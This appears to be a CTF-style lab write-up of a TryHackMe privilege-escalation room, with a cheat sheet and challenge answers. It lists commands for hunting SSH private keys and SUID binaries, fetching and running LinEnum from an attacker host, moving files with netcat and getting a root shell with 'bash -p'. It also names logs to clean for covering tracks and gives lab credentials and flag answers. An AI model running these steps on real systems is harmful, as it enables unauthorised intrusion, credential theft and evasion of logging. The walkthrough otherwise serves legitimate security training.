---
description: Networking - Priv Esc
---

# The Rogue Gnome

## Video

{% embed url="https://www.youtube.com/watch?v=\_SMxZPne5QU" %}

## Resources

[DVWA \(Damn Vulnerable Web App\)](http://www.dvwa.co.uk/)

`whoami` name of the account

`echo $0`  our shell

`python -c 'import pty; pty.spawn("/bin/bash")'`  spawn another shell and make it interactive

We're using `find` to search the volume, by specifying the root \(`/`\) to search for files named "id\_rsa" which is the name for _private_ SSH keys, and then using `2> /dev/null` to only show matches to us.

`find / -name id_rsa 2> /dev/null`

### The "Priv Esc Checklist"

1. Determining the kernel of the machine \(kernel exploitation such as Dirtyc0w\)
2. Locating other services running or applications installed that may be abusable \(SUID & out of date software\)
3. Looking for automated scripts like backup scripts \(exploiting crontabs\)
4. Credentials \(user accounts, application config files..\)
5. Mis-configured file and directory permissions

### Cheatsheets

* [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
* [payatu](https://payatu.com/guide-linux-privilege-escalation)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)

### SUID 101

 [GTFOBins](https://gtfobins.github.io/)

`find / -perm -u=s -type f 2>/dev/null`

### Enumeration Scripts

[LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

### Transfer Scripts

`python3 -m http.server 8080`

`nc -l -p 1337 > LinEnum.sh`    `nc -w -3 10.10.6.64 1337 < LinEnum.sh`

### Covering our Tracks

* "/var/log/auth.log" \(Attempted logins for SSH, changes too or logging in as system users:\)
* "/var/log/syslog" \(System events such as firewall alerts:\)
* "/var/log/&lt;service/" -- /var/log/apache2/access.log"

## Challenge

### What type of privilege escalation involves using a user account to execute commands as an administrator?

{% hint style="success" %}
vertical
{% endhint %}

### What is the name of the file that contains a list of users who are a part of the `sudo` group?

{% hint style="success" %}
sudoers
{% endhint %}

### Use SSH to log in to the vulnerable machine like so: `ssh cmnatic@10.10.6.64`

 Input the following password when prompted: **aoc2020**

![](../.gitbook/assets/image%20%2831%29.png)

{% hint style="success" %}
No answer needed
{% endhint %}

### Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of [GTFObins](https://gtfobins.github.io/) and your researching skills to learn how to exploit this binary.

You may find uploading some of the enumeration scripts that were used during today's task to be useful.

```text
wget 10.14.4.204:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

![](../.gitbook/assets/image%20%2825%29.png)

![](../.gitbook/assets/image%20%2819%29.png)

> https://gtfobins.github.io/gtfobins/bash/

```text
bash -p
```

![](../.gitbook/assets/image%20%2843%29.png)

{% hint style="success" %}
No answer needed
{% endhint %}

Use this executable to launch a system shell as root.

### What are the contents of the file located at **/root/flag.txt**?

```text
cat /root/flag.txt
```

![](../.gitbook/assets/image%20%2874%29.png)

{% hint style="success" %}
thm{2fb10afe933296592}
{% endhint %}

